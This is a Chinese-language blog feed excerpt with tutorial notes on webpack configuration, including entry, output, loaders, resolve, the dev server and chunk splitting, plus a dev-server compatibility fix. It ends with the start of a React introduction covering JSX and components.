<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: {
    index: [&apos;./src/index.js&apos;, &apos;./src/count.js&apos;],
    add: &apos;./src/add.js&apos; 
  },
  output: { filename: &apos;[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  // &#x5982;&#x679C;&#x4F20;&#x5165; template &#x4F1A;&#x4EE5;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x4E3A;&#x6A21;&#x677F;&#x53BB;&#x521B;&#x5EFA; html; &#x76F4;&#x63A5;&#x5199;&#x4F1A;&#x521B;&#x5EFA;&#x7A7A;&#x7684;&#x65B0; html &#x6587;&#x4EF6;
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;
};
</code></pre>
<ol>
<li>string --&gt; &apos;./src/index.js&apos;&#xFF0C;&#x5355;&#x5165;&#x53E3;&#x6253;&#x5305;&#x5F62;&#x6210;&#x4E00;&#x4E2A; chunk&#x3002; &#x8F93;&#x51FA;&#x4E00;&#x4E2A; bundle &#x6587;&#x4EF6;&#x3002;&#x6B64;&#x65F6; chunk &#x7684;&#x540D;&#x79F0;&#x9ED8;&#x8BA4;&#x662F; main&#x3002;</li>
<li>array --&gt; [&apos;./src/index.js&apos;, &apos;./src/add.js&apos;]&#xFF0C;&#x591A;&#x5165;&#x53E3;&#x6240;&#x6709;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x6700;&#x7EC8;&#x53EA;&#x4F1A;&#x5F62;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF0C;&#x8F93;&#x51FA;&#x51FA;&#x53BB;&#x53EA;&#x6709;&#x4E00;&#x4E2A; bundle &#x6587;&#x4EF6;&#x3002;&#xFF08;&#x4E00;&#x822C;&#x53EA;&#x7528;&#x5728; HMR &#x529F;&#x80FD;&#x4E2D;&#x8BA9; html &#x70ED;&#x66F4;&#x65B0;&#x751F;&#x6548;&#xFF09; <code>react:[&apos;react&apos;, &apos;react-dom&apos;, &apos;react-router-dom&apos;]</code></li>
<li>object&#xFF0C;&#x591A;&#x5165;&#x53E3;&#x6709;&#x51E0;&#x4E2A;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x5C31;&#x5F62;&#x6210;&#x51E0;&#x4E2A; chunk&#xFF0C;&#x8F93;&#x51FA;&#x51E0;&#x4E2A; bundle &#x6587;&#x4EF6;&#xFF0C;&#x6B64;&#x65F6; chunk &#x7684;&#x540D;&#x79F0;&#x662F; key &#x503C;&#x3002;</li>
<li>&#x7279;&#x6B8A;&#x7528;&#x6CD5;&#xFF1A;&#x591A;&#x5165;&#x53E3;&#x6253;&#x5305;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF0C;&#x518D;&#x5206;&#x522B;&#x6253;&#x5305;</li>
</ol>
<pre><code class="language-javascript">entry: { // bundle &#x662F;&#x7531; chunk &#x7EC4;&#x6210;
  // &#x6700;&#x7EC8;&#x53EA;&#x4F1A;&#x5F62;&#x6210;&#x4E00;&#x4E2A;chunk, &#x8F93;&#x51FA;&#x51FA;&#x53BB;&#x53EA;&#x6709;&#x4E00;&#x4E2A;bundle&#x6587;&#x4EF6;
  index: [&apos;./src/index.js&apos;, &apos;./src/count.js&apos;], 
  // &#x5F62;&#x6210;&#x4E00;&#x4E2A;chunk, &#x8F93;&#x51FA;&#x4E00;&#x4E2A;bundle&#x6587;&#x4EF6;&#x3002;
  add: &apos;./src/add.js&apos;
}
</code></pre>
<h3 id="output">output</h3>
<pre><code class="language-javascript">output: {
  // &#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF08;&#x6307;&#x5B9A;&#x540D;&#x79F0;+&#x76EE;&#x5F55;&#xFF09;
  filename: &apos;js/[name].js&apos;,
  // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF08;&#x5C06;&#x6765;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x8F93;&#x51FA;&#x7684;&#x516C;&#x5171;&#x76EE;&#x5F55;&#xFF09;
  path: resolve(__dirname, &apos;build&apos;),
  // &#x6240;&#x6709;&#x8D44;&#x6E90;&#x5F15;&#x5165;&#x516C;&#x5171;&#x8DEF;&#x5F84;&#x524D;&#x7F00; --&gt; &apos;imgs/a.jpg&apos; --&gt; &apos;/imgs/a.jpg&apos;
  publicPath: &apos;/&apos;,
  chunkFilename: &apos;js/[name]_chunk.js&apos;, // &#x6307;&#x5B9A;&#x975E;&#x5165;&#x53E3;chunk&#x7684;&#x540D;&#x79F0;
  library: &apos;[name]&apos;, // &#x6253;&#x5305;&#x6574;&#x4E2A;&#x5E93;&#x540E;&#x5411;&#x5916;&#x66B4;&#x9732;&#x7684;&#x53D8;&#x91CF;&#x540D;
  libraryTarget: &apos;window&apos; // &#x53D8;&#x91CF;&#x540D;&#x6DFB;&#x52A0;&#x5230;&#x54EA;&#x4E2A;&#x4E0A; browser&#xFF1A;window
  // libraryTarget: &apos;global&apos; // node&#xFF1A;global
  // libraryTarget: &apos;commonjs&apos; // conmmonjs&#x6A21;&#x5757; exports
},
</code></pre>
<h3 id="module">module</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: {
    rules: [
      // loader &#x7684;&#x914D;&#x7F6E;
      { test: /\.css$/,
       // &#x591A;&#x4E2A; loader &#x7528; use
       use: [&apos;style-loader&apos;, &apos;css-loader&apos;]
      },
      { test: /\.js$/,
       // &#x6392;&#x9664; node_modules &#x4E0B;&#x7684; js &#x6587;&#x4EF6;
       exclude: /node_modules/,
       // &#x53EA;&#x68C0;&#x67E5; src &#x4E0B;&#x7684; js &#x6587;&#x4EF6;
       include: resolve(__dirname, &apos;src&apos;),
       // &#x4F18;&#x5148;&#x6267;&#x884C;
       enforce: &apos;pre&apos;,
       // &#x5EF6;&#x540E;&#x6267;&#x884C; // enforce: &apos;post&apos;,
       // &#x5355;&#x4E2A; loader &#x7528; loader
       loader: &apos;eslint-loader&apos;,
       options: {}
      },
      { // &#x4EE5;&#x4E0B;&#x914D;&#x7F6E;&#x53EA;&#x4F1A;&#x751F;&#x6548;&#x4E00;&#x4E2A;
        oneOf: []
      }
    ]
  },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;
};
</code></pre>
<h3 id="resolve">resolve</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;,
  // &#x89E3;&#x6790;&#x6A21;&#x5757;&#x7684;&#x89C4;&#x5219;
  resolve: {
    // &#x914D;&#x7F6E;&#x89E3;&#x6790;&#x6A21;&#x5757;&#x8DEF;&#x5F84;&#x522B;&#x540D;: &#x4F18;&#x70B9;&#x7B80;&#x5199;&#x8DEF;&#x5F84; &#x7F3A;&#x70B9;&#x8DEF;&#x5F84;&#x6CA1;&#x6709;&#x63D0;&#x793A;
    alias: { $css: resolve(__dirname, &apos;src/css&apos;) },
    // &#x914D;&#x7F6E;&#x7701;&#x7565;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x7684;&#x540E;&#x7F00;&#x540D;
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    // &#x544A;&#x8BC9; webpack &#x89E3;&#x6790;&#x6A21;&#x5757;&#x662F;&#x53BB;&#x627E;&#x54EA;&#x4E2A;&#x76EE;&#x5F55; -- &#x5F53;&#x524D;&#x76EE;&#x5F55;&#x627E;&#x4E0D;&#x5230;&#x4F1A;&#x53BB;&#x4E0A;&#x4E00;&#x5C42;&#x76EE;&#x5F55;
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  }
};
</code></pre>
<h3 id="devserver">dev server</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;,
  resolve: {
    alias: { $css: resolve(__dirname, &apos;src/css&apos;) },
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  },
  devServer: {
    // &#x8FD0;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x76EE;&#x5F55; contentBase: resolve(__dirname, &apos;build&apos;),
    // &#x76D1;&#x89C6; contentBase &#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x65E6;&#x6587;&#x4EF6;&#x53D8;&#x5316;&#x5C31;&#x4F1A; reload
    watchContentBase: true,
    watchOptions: {
      // &#x5FFD;&#x7565;&#x6587;&#x4EF6; &#x2014;&#x2014; &#x9AD8;&#x6548;
      ignored: /node_modules/
    },
    // &#x542F;&#x52A8; gzip &#x538B;&#x7F29;
    compress: true,
    // &#x7AEF;&#x53E3;&#x53F7;
    port: 5000,
    // &#x57DF;&#x540D;
    host: &apos;localhost&apos;,
    // &#x81EA;&#x52A8;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;
    open: true,
    // &#x5F00;&#x542F; HMR &#x529F;&#x80FD;
    hot: true,
    // &#x4E0D;&#x8981;&#x663E;&#x793A;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;
    clientLogLevel: &apos;none&apos;,
    // &#x9664;&#x4E86;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x542F;&#x52A8;&#x4FE1;&#x606F;&#x4EE5;&#x5916;&#xFF0C;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x90FD;&#x4E0D;&#x8981;&#x663E;&#x793A;
    quiet: true,
    // &#x5982;&#x679C;&#x51FA;&#x9519;&#x4E86;&#xFF0C;&#x4E0D;&#x8981;&#x5168;&#x5C4F;&#x63D0;&#x793A;~
    overlay: false,
    // &#x670D;&#x52A1;&#x5668;&#x4EE3;&#x7406; --&gt; &#x89E3;&#x51B3;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x8DE8;&#x57DF;&#x95EE;&#x9898;
    proxy: {
      // &#x4E00;&#x65E6; devServer(5000)&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x5230; /api/xxx &#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668; (3000)
      &apos;/api&apos;: { target: &apos;http://localhost:3000&apos;,
               // &#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x8DEF;&#x5F84;&#x91CD;&#x5199;&#xFF1A;&#x5C06; /api/xxx --&gt; /xxx &#xFF08;&#x53BB;&#x6389;/api&#xFF09;
               pathRewrite: { &apos;^/api&apos;: &apos;&apos; }
              }
    }
  }
};
</code></pre>
<h3 id="optimization">optimization</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const TerserWebpackPlugin = require(&apos;terser-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/[name].[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;),
    chunkFilename: &apos;js/[name].[contenthash:10]_chunk.js&apos;
  },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;production&apos;,
  resolve: {
    alias: {
      $css: resolve(__dirname, &apos;src/css&apos;)
    },
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  },
  optimization: {
    splitChunks: {
      chunks: &apos;all&apos; // &#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x5199;~ ,
      minSize: 30 * 1024, // &#x5206;&#x5272;&#x7684; chunk &#x6700;&#x5C0F;&#x4E3A; 30kb
      maxSize: 0, // &#x6700;&#x5927;&#x6CA1;&#x6709;&#x9650;&#x5236;
      minChunks: 1, // &#x8981;&#x63D0;&#x53D6;&#x7684; chunk &#x6700;&#x5C11;&#x88AB;&#x5F15;&#x7528; 1 &#x6B21;
      maxAsyncRequest: 5, // &#x6309;&#x9700;&#x52A0;&#x8F7D;&#x5E76;&#x884C;&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#x6700;&#x5927;&#x6570;&#x91CF;
      maxInitialRequests: 3, // &#x5165;&#x53E3;js&#x6587;&#x4EF6;&#x6700;&#x5927;&#x5E76;&#x884C;&#x8BF7;&#x6C42;&#x6570;&#x91CF;
      automaticNameDelimiter: &apos;~&apos; , // &#x540D;&#x79F0;&#x8FDE;&#x63A5;&#x7B26;
      name: true, // &#x53EF;&#x4EE5;&#x547D;&#x540D;&#x89C4;&#x5219;
      cacheGroups: { // &#x5206;&#x5272;chunk&#x7EC4;
      	vendors&#xFF1A;{ // node_modules&#x6587;&#x4EF6;&#x88AB;&#x6253;&#x5305;&#x5230; vendors &#x7EC4;&#x7684; chunk &#x4E2D; --&gt; vendors~xxx.js
      		test: /[||/]node_modules[\\/]/,
      		priority: -10
   			},
    		default: {
      		minChunks: 2, // &#x88AB;&#x63D0;&#x53D6;&#x7684; chunk &#x81F3;&#x5C11;&#x88AB;&#x5F15;&#x7528;&#x4E24;&#x6B21;
          priority: -10,
          // &#x5F53;&#x524D;&#x6253;&#x5305;&#x6728;&#x5757;&#x548C;&#x4E4B;&#x524D;&#x88AB;&#x63D0;&#x53D6;&#x6A21;&#x5757;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x5219;&#x53EF;&#x4EE5;&#x590D;&#x7528;
          reuseExistingChunk: true
    		}
    	}
    },
    // &#x5C06;&#x5F53;&#x524D;&#x6A21;&#x5757;&#x7684;&#x8BB0;&#x5F55;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x7684; hash &#x5355;&#x72EC;&#x6253;&#x5305;&#x4E3A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; runtime
    // &#x89E3;&#x51B3;&#xFF1A;&#x4FEE;&#x6539; a &#x6587;&#x4EF6;&#x5BFC;&#x81F4; b &#x6587;&#x4EF6;&#x7684; contenthash &#x53D8;&#x5316; -- &#x67D0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x5BFC;&#x81F4; hash &#x53D8;&#x5316;&#x5BFC;&#x81F4;&#x7F13;&#x5B58;&#x5931;&#x6548;
    runtimeChunk: { name: entrypoint =&gt; `runtime-${entrypoint.name}` },
    minimizer: [
      // &#x914D;&#x7F6E;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x7684;&#x538B;&#x7F29;&#x65B9;&#x6848;&#xFF1A;js &#x548C; css
      new TerserWebpackPlugin({
        // &#x5F00;&#x542F;&#x7F13;&#x5B58;
        cache: true,
        // &#x5F00;&#x542F;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;
        parallel: true,
        // &#x542F;&#x52A8; source-map
        sourceMap: true })
    ]
  }
}; 
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="webpackdevserver">webpack-dev-server&#x517C;&#x5BB9;&#x95EE;&#x9898;</h2>
<p>&#x8FD0;&#x884C;<code>webpack-dev-server</code>&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x62A5;&#x9519;</p>
<pre><code class="language-javascript">&gt; webpack-dev-server

internal/modules/cjs/loader.js:883
  throw err;
  ^

Error: Cannot find module &apos;webpack-cli/bin/config-yargs&apos;
</code></pre>
<p>&#x62A5;&#x9519;&#x5185;&#x5BB9;&#x4E3A;&#x627E;&#x4E0D;&#x5230; webpack-cli &#x4E2D;&#x5BF9;&#x5E94;&#x6A21;&#x5757;&#x3002;&#x62A5;&#x9519;&#x65F6;&#x9879;&#x76EE;&#x76F8;&#x5E94; webpack &#x914D;&#x7F6E;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code class="language-javascript">&quot;webpack&quot;: &quot;^5.24.3&quot;,
&quot;webpack-cli&quot;: &quot;^4.5.0&quot;,
&quot;webpack-dev-server&quot;: &quot;^3.11.2&quot;
</code></pre>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF1A;</p>
<ul>
<li>&#x65B9;&#x6CD5;&#x4E00;:&#x91CD;&#x88C5; webpack-cli &#x4E0E; webpack-dev-server &#x517C;&#x5BB9;&#x7684;&#x7248;&#x672C;;</li>
<li>&#x65B9;&#x6CD5;&#x4E8C;:&#x4FEE;&#x6539; <code>package.json</code> &#x6587;&#x4EF6;&#x4E2D; <code>&quot;script&quot;</code> &#x9879;</li>
</ul>
<p>&#x65B9;&#x6CD5;&#x4E8C;&#x6B65;&#x9AA4;&#x3002;</p>
<pre><code>// package.json &#x914D;&#x7F6E;&#x6587;&#x4EF6; &quot;script&quot; &#x4E2D;&#x4FEE;&#x6539; &quot;dev&quot; &#x9879;&#x503C; &quot;webpack-dev-server&quot; &#x4E3A; &quot;webpack serve --open Chrome&quot;
</code></pre>
<p>&#x5728;&#x91CD;&#x65B0;&#x914D;&#x7F6E;&#x5B8C;&#x540E;<code>Terminal</code>&#x8F93;&#x5165;&#xFF1A;<br>
<code>npm run dev</code><br>
&#x7ECF;&#x6D4B;&#x8BD5;&#xFF0C;&#x6B64;&#x65F6;&#x53EF;&#x6B63;&#x5E38;&#x5B9E;&#x65F6;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x7684;js&#x6587;&#x4EF6;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id>&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 &#x534F;&#x8BAE;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[React]]></title><description><![CDATA[React (also known as React.js or ReactJS) & Meta]]></description><link>yourdomain.com/react/</link><guid isPermaLink="false">60f6b68a6aa9bdead2d22794</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 04 Mar 2021 11:42:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/08/React.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<img src="yourdomain.com/content/images/2022/08/React.png" alt="React"><p>React &#x4E3B;&#x8981;&#x8D1F;&#x8D23; MVC &#x4E2D;&#x89C6;&#x56FE;&#x5C42; View &#x7684;&#x6E32;&#x67D3;&#x3002;&#x5E93; react &#x548C; react-dom &#x5206;&#x522B;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x548C;&#x6E32;&#x67D3;&#x5143;&#x7D20;&#x3002;</p>
<ul>
<li>React.createElement &#x7684;&#x53C2;&#x6570;&#x5206;&#x522B;&#x662F;&#x5143;&#x7D20;&#x540D;&#x3001;&#x5143;&#x7D20;&#x5C5E;&#x6027;&#x548C;&#x5B50;&#x8282;&#x70B9;|&#x6587;&#x672C;&#x8282;&#x70B9;</li>
<li>render &#x7684;&#x53C2;&#x6570;&#x662F;&#x5F85;&#x6E32;&#x67D3;&#x5143;&#x7D20;&#x548C;&#x9875;&#x9762;&#x5143;&#x7D20;&#x6302;&#x8F7D;&#x70B9;&#xFF1B;&#x8FD4;&#x56DE;&#x503C;&#x63CF;&#x8FF0;&#x9875;&#x9762;&#x7684;&#x5185;&#x5BB9;</li>
</ul>
<pre><code class="language-jsx">import React from &apos;react&apos;; // &#x63D0;&#x4F9B; React.StrictMode
import ReactDOM from &apos;react-dom/client&apos;;
...
const title = React.createElement(&apos;h1&apos;, null, &apos;Hello React&apos;) // &#x521B;&#x5EFA; react &#x5143;&#x7D20;
ReactDOM.render(title, document.getElementById(&apos;root&apos;)) // &#x6E32;&#x67D3; react &#x5143;&#x7D20;&#x5230;&#x9875;&#x9762;
</code></pre>
<h3 id="jsx-javascript-xml"><a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a> =&gt; JavaScript XML</h3>
<blockquote>
<p>React embraces the fact that rendering logic is inherently coupled with other UI logic =&gt; &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x3001;&#x72B6;&#x6001;&#x6539;&#x53D8;&#x3001;&#x6570;&#x636E;&#x6E32;&#x67D3; -&gt; &#x4E92;&#x76F8;&#x5F71;&#x54CD;</p>
</blockquote>
<blockquote>
<p>Since JSX is closer to JavaScript than to HTML, React DOM uses camelCase property naming convention instead of HTML attribute names.<br>
class  =&gt;  className in JSX, tabindex  =&gt;  tabIndex, and for =&gt; htmlFor</p>
</blockquote>
<pre><code class="language-jsx">/* input &#x6807;&#x7B7E;&#x70B9; label &#x83B7;&#x53D6;&#x7126;&#x70B9; */
&lt;label for=&quot;username&quot;&gt;username&#xFF1A;&lt;/label&gt; // Native
&lt;label htmlFor=&quot;username&quot;&gt;username&#xFF1A;&lt;/label&gt; // React
&lt;input type=&quot;text&quot; id=&quot;username&quot;&gt;&lt;/input&gt;
</code></pre>
<p>&#x4F5C;&#x4E3A; React.createElement &#x7684;&#x8BED;&#x6CD5;&#x7CD6;&#xFF0C;JSX &#x662F;&#x7ECF; @babel/preset-react &#x5305;&#x4E0B;&#x7684; Babel &#x914D;&#x7F6E;&#x5B8C;&#x6210;&#x8F6C;&#x4E49;&#x3002;React.createElement &#x8C03;&#x7528;&#x540E;&#x4F1A;&#x4EA7;&#x751F;&#x79F0;&#x4F5C; React &#x5143;&#x7D20;&#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
<pre><code class="language-jsx">const element = ( &lt;h1 className=&quot;greeting&quot;&gt; Hello, world! &lt;/h1&gt; ); // &#x8F6C;&#x4E49;&#x524D;
const element = React.createElement( &apos;h1&apos;, {className: &apos;greeting&apos;}, &apos;Hello, world!&apos; );
</code></pre>
<pre><code class="language-jsx">// React &#x901A;&#x8FC7;&#x8BFB;&#x53D6;&#x8FD9;&#x4E9B;&#x5BF9;&#x8C61;&#x6765;&#x6784;&#x5EFA; DOM &#x4EE5;&#x53CA;&#x4FDD;&#x6301;&#x968F;&#x65F6;&#x7684;&#x66F4;&#x65B0;
const element = { type: &apos;h1&apos;, props: { className: &apos;greeting&apos;, children: &apos;Hello, world!&apos; } };
</code></pre>
<ul>
<li>JSX &#x662F; React &#x58F0;&#x660E;&#x5F0F;&#x7684;&#x4F53;&#x73B0;&#xFF0C;React.createElement &#x662F;&#x547D;&#x540D;&#x5F0F;&#x7684;&#x4F53;&#x73B0;</li>
<li>JSX &#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x82B1;&#x62EC;&#x53F7;&#x5D4C;&#x5165; JavaScript &#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4E0D;&#x53EF;&#x4EE5;&#x5D4C;&#x5165;&#x8BED;&#x53E5;</li>
</ul>
<p>&#x8BED;&#x53E5;&#x4F1A;&#x4EA7;&#x751F;&#x80FD;&#x7528;&#x53D8;&#x91CF;&#x63A5;&#x6536;&#x7ED3;&#x679C;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x653E;&#x5728;&#x4EFB;&#x4F55;&#x9700;&#x8981;&#x503C;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#x4E0D;&#x540C;&#x4E8E;&#x4F9D;&#x9760;&#x6846;&#x67B6;&#x63D0;&#x4F9B;&#x7684;&#x8BED;&#x6CD5;&#x589E;&#x5F3A; HTML &#x7ED3;&#x6784;&#xFF0C;React &#x5229;&#x7528;&#x8BED;&#x8A00;&#x81EA;&#x8EAB;&#x80FD;&#x529B;&#x7F16;&#x5199;&#x7ED3;&#x6784;&#x7684;&#x9700;&#x8981;&#x3002;</p>
<p>&#x7531;&#x4E8E;&#x6CA1;&#x6709;&#x6307;&#x4EE4;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x6761;&#x4EF6;&#x6E32;&#x67D3;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x6807;&#x8BC6;&#x53D8;&#x91CF;&#xFF0C;&#x5217;&#x8868;&#x6E32;&#x67D3;&#x9700;&#x8981;&#x5728;&#x82B1;&#x62EC;&#x53F7;&#x4E2D;&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x539F;&#x578B;&#x7684; map &#x65B9;&#x6CD5;&#x3002;</p>
<ul>
<li>React &#x5728;&#x6837;&#x5F0F;&#x5904;&#x7406;&#x4E2D;&#x63A8;&#x8350;&#x884C;&#x5185;&#x6837;&#x5F0F;&#x800C;&#x975E;&#x7C7B;&#x540D;&#xFF0C;&#x5F00;&#x53D1;&#x4E2D;&#x63A8;&#x8350;&#x4F7F;&#x7528; className</li>
</ul>
<pre><code class="language-jsx">// &#x884C;&#x5185;&#x6837;&#x5F0F;&#x53EF;&#x4EE5;&#x5177;&#x6709;&#x591A;&#x4E2A; =&gt; &#x5BF9;&#x8C61;&#x5F62;&#x5F0F;
var styleObj = {color: &apos;black&apos;, backgroundColor: &apos;white&apos;}
&lt;h1 style={styleObj}&gt; JSX &#x6837;&#x5F0F; &lt;/h1&gt;
&lt;h1 style={{color: &apos;black&apos;, backgroundColor: &apos;white&apos;}}&gt; JSX &#x6837;&#x5F0F; &lt;/h1&gt; // &#x53CC;&#x82B1;&#x62EC;&#x53F7;&#x4E0D;&#x662F;&#x8BED;&#x6CD5; =&gt; &#x53EA;&#x6709;&#x5355;&#x82B1;&#x62EC;&#x53F7;&#x662F;
</code></pre>
<h3 id="components">Components</h3>
<ul>
<li><a href="https://reactjs.org/docs/components-and-props.html">&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x548C;&#x7C7B;&#x7EC4;&#x4EF6;</a> Function and Class Components</li>
</ul>
<blockquote>
<p>&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x6CA1;&#x6709;&#x72B6;&#x6001;&#xFF0C;&#x63A5;&#x6536;&#x552F;&#x4E00;&#x5E26;&#x6709;&#x6570;&#x636E;&#x7684; props &#x5C5E;&#x6027;&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; React &#x5143;&#x7D20;&#x3002;&#x51FD;&#x6570;&#x540D;&#x5FC5;&#x987B;&#x7528;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#x5F00;&#x5934;&#xFF0C;&#x4EE5;&#x533A;&#x5206;&#x7EC4;&#x4EF6;&#x4E0E;&#x666E;&#x901A; React &#x5143;&#x7D20;</p>
</blockquote>
<pre><code class="language-jsx">function Hello(props) { return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;; }
const Hello = (props) =&gt; &lt;div&gt;Hello, {props.name}&lt;/div&gt;
</code></pre>
<blockquote>
<p>&#x7C7B;&#x7EC4;&#x4EF6;&#x4F7F;&#x7528; ES6 &#x7684; class &#x5B9A;&#x4E49;&#xFF0C;&#x666E;&#x901A;&#x7C7B;&#x7EE7;&#x627F; React.Component &#x624D;&#x80FD;&#x6210;&#x4E3A;&#x7EC4;&#x4EF6;&#x7C7B;</p>
</blockquote>
<pre><code class="language-jsx">class Hello extends React.Component { render() { return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;; } }
</code></pre>
